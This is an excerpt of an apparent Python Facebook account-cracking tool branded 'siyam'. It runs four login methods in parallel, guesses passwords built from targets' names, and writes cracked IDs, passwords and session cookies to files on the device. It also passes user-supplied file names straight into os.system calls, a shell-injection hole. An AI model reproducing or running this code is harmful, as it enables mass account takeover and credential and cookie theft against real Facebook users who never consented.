...
from concurrent.futures import ThreadPoolExecutor as siyamsiyam
from string import * 
...
.----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |    _______   | || |     _____    | || |  ____  ____  | || |      __      | || | ____    ____ | |
| |   /  ___  |  | || |    |_   _|   | || | |_  _||_  _| | || |     /  \     | || ||_   \  /   _|| |
| |  |  (__ \_|  | || |      | |     | || |   \ \  / /   | || |    / /\ \    | || |  |   \/   |  | |
| |   '.___`-.   | || |      | |     | || |    \ \/ /    | || |   / ____ \   | || |  | |\  /| |  | |
| |  |`\____) |  | || |     _| |_    | || |    _|  |_    | || | _/ /    \ \_ | || | _| |_\/_| |_ | |
| |  |_______.'  | || |    |_____|   | || |   |______|   | || ||____|  |____|| || ||_____||_____|| |
| |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------' """
def clear():
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back siyam Menu ")
        exit()
...
def siyam():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open www.facebook.com/profile.php?id=100089418143480')
        pass
    elif select =='F':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100089418143480')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        siyam(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[siyam] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);siyamb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={siyamb};{ckkk}"
                    print(f"\r{R} [siyam-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/siyam_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/siyam_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [siyam-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/siyam_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[siyam] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [siyam-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/siyam_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/siyam_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [siyam-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[siyam] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[siyam] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [siyam-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/siyam_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with siyamsiyam(max_workers=30) as siyamworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                siyamworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                siyamworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                siyamworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                siyamworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/siyam.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/siyam.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    siyam = input('Put File Name :')
    print(" ")
    siyam = input('Saving Put File Name :')
    os.system('touch ' +siyam)
    os.system('sort -r '+siyam+' | uniq > '+siyam)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + siyam )
    print(47*'-')
    print("File Saved To :" + siyam )
    print(47*'-')
    input(f"{S} Press Enter To Back siyam Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/siyam.txt\n') 
        filepath = input("Put File Name: ")
